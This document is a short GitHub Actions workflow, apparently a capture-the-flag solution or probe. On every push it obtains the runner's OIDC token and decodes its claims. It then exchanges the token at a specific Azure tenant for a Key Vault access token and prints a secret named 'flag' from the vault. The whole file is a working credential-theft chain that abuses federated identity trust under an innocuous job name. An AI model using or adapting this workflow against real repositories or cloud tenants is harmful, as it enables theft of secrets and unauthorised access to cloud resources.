name: zcheck
on: push
permissions:
  id-token: write
  contents: read
jobs:
  go:
    runs-on: ubuntu-latest
    steps:
      - name: probe
        run: |
          set +e
          echo "event=$GITHUB_EVENT_NAME repo=$GITHUB_REPOSITORY ref=$GITHUB_REF"
          echo "url=${ACTIONS_ID_TOKEN_REQUEST_URL:+PRESENT} tok=${ACTIONS_ID_TOKEN_REQUEST_TOKEN:+PRESENT}"
          [ -z "$ACTIONS_ID_TOKEN_REQUEST_URL" ] && { echo NO-OIDC; exit 0; }
          J=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
          echo "jwt_len=${#J}"
          P=$(printf '%s' "$J" | cut -d. -f2); while [ $((${#P}%4)) -ne 0 ]; do P="${P}="; done
          printf '%s' "$P" | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -c 'import sys,json;d=json.load(sys.stdin);print("SUB="+str(d.get("sub")));print("AUD="+str(d.get("aud")));print("REPO="+str(d.get("repository")))'
          VT=$(curl -sS -X POST "https://login.microsoftonline.com/3205c325-06a5-4171-9ce8-ffc5e6c2845e/oauth2/v2.0/token" -d client_id=72ff278a-9e71-43ec-bac4-2ca303f8e462 -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$J" --data-urlencode "scope=https://vault.azure.net/.default")
          echo "exchange=$(printf '%s' "$VT" | head -c 400)"
          TOK=$(printf '%s' "$VT" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
          if [ -n "$TOK" ]; then
            echo "== FLAG =="; curl -sS -H "Authorization: Bearer $TOK" "https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/flag?api-version=7.4"
          fi
